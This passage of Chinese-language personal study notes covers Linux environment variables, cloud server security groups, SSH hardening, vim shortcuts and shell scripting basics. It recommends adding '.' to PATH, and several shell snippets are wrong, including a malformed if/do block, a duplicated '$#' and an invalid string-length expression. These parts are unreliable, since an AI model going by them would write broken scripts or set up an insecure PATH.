  #ANS：将当前目录添加到PATH中，每换一次目录都要添加一个目录到PATH中？
  #只要将任意目录的当前目录添加到PATH中
  export PATH=$PATH:.
  ```

* 设置系统环境变量（永久生效）

  **系统环境变量对所有用户生效**

  在etc/profile.d中创建脚本`cd /etc/profile.d`

  ```bash
  vi abc.sh
  添加内容：
  export aa='aa value'
  export bb='bb value'
  ```

* 设置用户环境变量（永久生效）

  **用户环境变量只对当前用户生效，每个用户都可以配置只属于自己使用的环境变量**

  在用户主目录下有几个隐藏文件，通过`ls -l .bash*`查看。

  在`.bash_profile`中添加用户环境变量。

  ```bash
  export aa='aa value'
  ```

---

## 22. 云服务器的网络设置

### （1）云服务器的网络环境

购买的云服务器会有一个公网IP和一个私有IP，私有IP是服务器那边的局域网内的IP，局域网内的服务器可以互相访问。公网IP是通过互联网访问这个服务器的IP，是由路由器将公网IP绑定到局域网内的某个服务器的。

有的服务器也可以没有公网IP，比如：一个网站的访问量太大，一台服务器扛不住，需要2台，一台负责网站访问，一台负责数据库。那么负责网站访问的那台服务器可以分配一个公网IP用于用户通过互联网访问，负责数据库的那台服务器就可以不要公网IP，而是可以通过有公网IP的那台服务器在局域网内通过ssh链接。

也可以在云服务器的云控制台登录。

```bash
首先通过连接有公网IP的那台服务器，然后ssh另一台只有私有IP的服务器
ssh root@私有IP
```

![image-20221201020859292](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221201020859292.png)

### （2）配置云服务器的安全组/访问策略（访问规则）

公网访问服务器通过2道防火墙。

讲解视频：https://www.bilibili.com/video/BV1QG4y1t7ME?p=29&spm_id_from=pageDriver&vd_source=3b08e97e50222fa2ec22737f6dcb2202

访问策略/安全组：每个云服务器都有主机防火墙，外面还有一个总的防火墙，这个总的防火墙就叫安全组。

比如在其中一个服务器上运行一个服务程序，端口号是5005，那么主机防火墙要开通端口号5005，安全组也要开通端口号5005。外部通过公网IP访问这个服务器的5005端口需要通过这2个防火墙。（服务器在局域网内部通过私有IP互相访问时没有经过防火墙。但通过公网IP访问时要通过安全组）

![image-20221201021240893](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221201021240893.png)

在云服务器操作页面，`创建安全组->设置访问规则（入方向）->添加端口5005`

---

## 23. 云服务器的安全问题

云服务器被黑客攻击，会被云平台收回（不退钱）

所以按照下列步骤处理：

* 设置强密码并保存

* 禁用root用户远程登录

  创建普通用户，以普通用户的身份登录服务器，若需要用到root用户，以su切换。

* 修改ssh端口

  把ssh端口号改为其他，不要用22。

  ```bash
  修改/etc/ssh/sshd_config
  把
  #Port 22
  改为
  Port 其他端口号
  ```

---

## 24. vim

```bash
:set number 显示行号
:n 光标跳到第n行
G 跳到最后一行
gg 跳到第一行行首 
$ 移动到行末
0 移动到行首
I 在行首插入
A 在行末插入
o 在下方插入空白行
O 在上面插入空白行
w 下一个词首
b 上一个词首
de 删除一个词
ce 删除一个词并插入
D 删除本行中光标后的全部内容
yy 复制当前行
dd 删除当前行
ndd 删除n行
P 在光标前黏贴
p 在光标后黏贴（光标下一行黏贴）
:a,bmc	a-b行代码剪切到m行下一行
ctrl-insert 复制
shift-insert 黏贴
u 撤销
ctrl-r 恢复
ctrl-u 上翻半页
ctrl-d 下翻半页
```



---

# Shell脚本（了解）

Shell本身也是一门编程语言，学了不用会忘。

**会写简单脚本、会读脚本即可，写复杂脚本更多采用Python。对程序员来说要实现功能逻辑用编程语言调用系统调用完成。**

## 0. 关键字汇总

```bash
sleep 1s
sleep 1m
sleep 1h
sleep 1d
```

```bash
#命令执行结果赋值给变量
a=`ls -al`
```

```bash
#整数运算赋值给变量
a=`expr 2 \* 3`		#将命令expr 2 \* 3的结果赋值给a
a=$(( 2*3 ))
```

```bash
#变量自增、自减
let i++
i=`expr i + 1`
i=$(( i+1 ))
```

```bash
if [ $? -eq 0 ]
then 
fi

if (( i<10 ))
```

```bash
i=0
while (( i<10 ))
do
	echo $i
	let i++
	i=`expr $i + 1`

while :			#死循环
```

```bash
for i in ${arr[*]}
do
	echo $i
done

for (( i=0;i<10;i++ ))

for (( i=0;i<${#arr[*]};i++))
```



## 1. 概念

* 不再是bash中输入一个一个单独的命令返回一个一个单独的结果，而是将命令和代码写在.sh脚本文件中，运行文件可执行一系列操作。类似于Windows的.bat批处理。

* 脚本文件需要脚本解释器，Linux中脚本解释器有很多种，如：/bin/sh和/bin/bash。Linux默认bash，一般使用bash。

* Python脚本可以/bin/Python解释器执行。

* 脚本第一行以下列代码指定解释器

  ```bash
  #！/bin/bash
  ```

* 执行脚本前，先添加执行权限

  ```bash
  chmod ug+x *.sh
  # u表示用户，g表示同组用户，+表示增加权限，x表示执行
  ```

* 注释

  ```bash
  #注释单行
  
  <<:EOF
  	注释多行...
  	注释多行...
  	注释多行...
  EOF
  ```


---

## 2. 父子shell

* 在shell中输入bash会打开一个子shell，exit可退出子shell

* 如果脚本的第一行指定了`#!/bin/bash`或者你直接使用`bash script.sh`的形式来执行脚本，这都会启动一个新的bash进程，即子shell。执行完脚本即从bash子进程退出。子bash的变量不会影响父bash的变量。

  ![image-20221126030623437](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221126030623437.png)


* **创建子shell时实际上也创建了一个新的进程。可以通过特殊变量`$BASHPID`来获取子shell的进程ID，而`$PPID`则表示父shell的进程ID。另外，`SHLVL`和`BASH_SUBSHELL`这两个变量可以用来跟踪嵌套的shell层数。**

* 不开启bash子进程的执行方法：在当前shell以`source xx.sh`的方式引入。这样将脚本中变量至今引入当前shell，当前shell的变量将会受到影响

  ![image-20221126031039792](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221126031039792.png)

* 子shell变量的作用域不到父shell


---

## 3. 变量

### （1）类型

* 环境变量（也叫全局变量）——能够被当前shell及其子shell都访问的变量。

  > * 大部分的系统预置变量，如：
  >
  >   $HOME——当前用户主目录
  >
  >   $PWD——当前目录
  >
  >   $SHELL——当前使用的shell解释器
  >
  >   $USER——当前用户
  >
  > * set命令：输出所有变量（包括环境变量、局部变量）
  >
  > * env命令：只输出环境变量

* 局部变量——只能被当前shell访问，无法被父shell或子shell访问的变量。

* 特殊变量——**$?**

  用于获取上一个命令执行的“结果码”。并不能返回执行结果本身，只能返回0-255。0表示执行无错，1-255表示错误码。

  如：

  ```bash
  ls -la
  echo $?
  # 0
  ```

### （2）变量的定义与使用

* shell变量类型默认是字符串

* 定义/赋值

  ```bash
  name="ssss"
  ```

  > * **=两侧不能有空格**。因为Linux命令的格式是`命令+空格+参数+空格+操作对象`，一旦在=两侧加了空格，系统将会误以为变量名是命令，而以解析命令的方式处理。
  >
  > * "ssss"的引号可以省略
  >
  > * 双引号识别特殊字符。单引号不识别特殊字符，会直接将引号中的内容直接作为字符串。
  >
  >   ```bash
  >   age=20
  >   age1="${age}"
  >   age2='${age}'
  >   echo age1 # 20
  >   echo age2 # ${age}
  >   ```
  >
  
  
  
* 使用变量

  ```bash
  echo ${name}
  # 或省略{}，加上{}是为了避免变量名歧义更加规范
  ```

* 删除变量

  变量删除后不再能够使用

  ```bash
  unset name
  ```

* 只读变量

  ```bash
  name="sss"
  readonly name # 定义为只读变量后不能再试图通过赋值来修改变量值
  ```

### （3）字符串

shell中变量取值默认的是字符串。

* 单引号不识别特殊字符，引号里什么值就是什么值。

* 字符串拼接

  写在一起就行

  ```shell
  a="hello"
  b=" world"
  c=$a$b
  echo $c
  # hello world
  ```

* 双引号识别特殊字符

  ```shell
  	age="20"
  	age2='${age}'
  	age3="${age}"
  	echo $age2
  	#'${age}' #单引号不识别，直接把引号中内容打印出来
  	echo $age3
  	#20         #双引号则会将${age}识别成20
  ```

* 获取字符串长度

  ```shell
  ${#"helloworld"}
  ```

### （4）数组

* 定义

  ```shell
  	arr=(val1 val2 val3 val4)
  	或
  	arr=()
  	arr[0]=val1
  	arr[1]=val2
  	arr[2]=val3
  	arr[3]=val4
  ```

* 访问元素

  ```shell
  	echo ${arr[0]}    #获取第一个元素
  	echo ${arr[-1]}  #获取最后一个元素
  ```

* 获取数组长度

  ```shell
  len=${#arr[*]}
  ```

* 获取数组所有元素

  ```shell
  ${arr[*]}
  ```

* 获取所有下标

  ```shell
  ${!array[*]}
  ```

* 遍历数组

  ```shell
  	for i in "${array[*]}"		#这里i是array的每个元素
  	do 
  		echo $i
  	done
  或
  	for i in ${!array[*]}		#这里i是array的下标
  	do 
  		echo ${array[i]}
  	done
  ```

* 关联数组-以字符串作为下标key

  ```shell
  	declare -A arr
  	arr[name]="wk"
  	arr[age]=30
  	或
  declare -A arr=([name]="wk" [age]=30)
  ```

---

## 4. 命令替换

将命令执行的结果对变量进行赋值

使用`$()`或***``***将要执行的命令括起来

```shell
a=$(ls ./)
echo $a

b=`ls ./`
echo $b
```

---

## 5. 读取和输出

read

```shell
read -p "提示信息"	变量名
```

echo

```shell
echo "hello world"
```

---

## 6. 流程控制

### （1）条件表达式

`test expression`可简写成`[ expression ]`。**注意expression和两侧括号间有空格。if和括号之间也有空格**

```shell
if [ -d "/home/wk/workspace" ]
then
	echo "dir exist.."
fi
```

* 条件运算符

  文件判断

  > -e filename：判断文件是否存在
  >
  > -d filename：判断文件是否存在，且是否是目录文件
  >
  > -x filename：判断文件是否存在，且是否具有可执行权限
  >
  > -r filename：判断文件是否存在，且是否具有可读权限
  >
  > -w filename：判断文件是否存在，且是否具有可写权限

  **整数比较，在bash风格中必须使用这种。但是在(())中就可以不用**

  > -eq 等于
  >
  > -ne 不等
  >
  > -gt 大于
  >
  > -ge 大于等于
  >
  > -lt 小于
  >
  > -le 小于等于

  字符串比较

  > str1==str1 字符串相等
  >
  > str1!=str2 字符串不等

```bash
if [ i eq 10 ]
do 
	echo $i
done

if (( i==10 ))
do
	echo $i
done
```

### （2）if语句

```bash
if cond1
then
	command1
elif cond2
then
	command2
else
	command3
fi
```

### （3）for循环和while循环

* while的bash风格

  ```bash
  while [ condition ]
  do 
  	...
  done
  ```

  ```bash
  #死循环写法
  i=1
  while :
  do 
  	let i++		#等价于i=$($i + 1)或i=`expr $i + 1`
  done
  ```

* for的bash风格

  ```bash
  for var in list
  do 
  	commands
  done
  #var在循环语句外也能使用，且保持最后一个var的值
  ```

* list可以是命令执行的结果

  ```shell
  filename="/home/wk/workspace/demo.cpp"
  for var in $(cat $filename)
  ```

  ```shell
  list=$(cat $filename)
  for var in list
  ```

* C风格

  ```bash
  for (( i=0;i<10;i++ ))
  do
  	...
  done
  ```

  ```bash
  while (( i<10 ))
  do
  	...
  done
  ```
  
  ### （4）for和if嵌套
  
  

---

## 7. 函数传参

函数名后跟参数值。函数体内以$1/$2/$3...表示参数：

- **$0——文件名**
- **$1/$2/$3——参数**
- $#——传递给脚本的参数个数
- $*——将所有参数以一个字符串的形式输出
- $#——将所有参数各个以字符串的形式输出s
- $$ 这个脚本/程序的PID(脚本运行的当前进程PID)
- $? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)
- 

---

## 8. 整数数值计算

将整数计算的数值赋值给变量：

* 方法1

  使用(())，在括号内部可以直接进行整数计算。

```shell
a=$((1+3)) 	
b=$((3*3))
c=$(($a+$b))
```

* 方法2

**expr是一个命令，表示将后面的作为一个整数表达式进行计算。反引号赋值的方式，将expr命令的结果，也就是表达式的计算结果赋值给a。**

```shell
a=`expr 3 \* 3`	#这种方法写的时候表达式数字和运算符间要有空格，乘法要转义字符，否则会被识别为通配符
```

---

## 9. 函数

* 定义

  shell是脚本语言，是一行一行执行，不会像编译型语言那样进行编译，所以在调用函数前必须要先定义。

  ```shell
  	func(){
  		commands...
  		
  		return或echo
  	}
  ```

* 调用

  通过函数名func调用

* **只能通过$?获取最近的执行的函数的返回值，0表示无错。**

* 返回值：可以显式的以return返回，return后跟0-255之间的数值（并不是能够返回任意结果，只能返回一个“结果码”），可用0表示执行无错，1,2,3等具体数字表示错误信息。

  ![image-20221201025439189](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221201025439189.png)

---

## 10. 重定向

```shell
>		#输出重定向
>>		#输出追加
```

---

## 11. sleep命令

shell中休眠时间

```bash
sleep 1s	#1秒
sleep 1m	#1分
sleep 1h	#1小时
sleep 1d	#1天
```

---

## 12. timeout-超时终止

用于限定命令或脚本的执行时间，超过设定时间若命令仍在执行则kill进程。

具体使用见`man timeout`

```bash
timeout 时间 命令/脚本
```

> * timeout后接函数的话无效

```bash
timeout 10s	ping www.baidu.com	#ping命令执行10s
#开辟两个进程，父进程timeout 10s ping www.baidu.com，子进程ping www.baidu.com
```

```bash
timeout 1m ./test.sh
```

---

## 14. 计算shell脚本执行时间

```bash
shell脚本运行时间，下次用到可直接copy
starttime=`date +'%Y-%m-%d %H:%M:%S'`
 需执行的程序
 endtime=`date +'%Y-%m-%d %H:%M:%S'`
start_seconds=$(date --date="$starttime" +%s);
end_seconds=$(date --date="$endtime" +%s);
echo "本次运行时间： "$((end_seconds-start_seconds))"s"
```

```bash
计算脚本执行时间：

 #!/bin/bash

 UseTime () {

     startTime=`date +%Y%m%d-%H:%M`

     startTime_s=`date +%s`

     $Command              #根据自己脚本路径，测试脚本文件执行时间（sh test.sh)

     endTime=`date +%Y%m%d-%H:%M`

     endTime_s=`date +%s`

     sumTime=$[ $endTime_s - $startTime_s ]

     useTime=$[ $sumTime / 60 ]

     echo "$startTime ---> $endTime" "Totl:$useTime minutes"  >> /tmp/usertime.txt

 }

 

 hello () {

     echo "hello !"

     sleep 120

 }

 

 Command=hello

 UseTime $Command



计算脚本使用时间分钟

cat /tmp/usertime.txt 

20170510-14:54 ---> 20170510-14:56 Totl:2 minutes
```













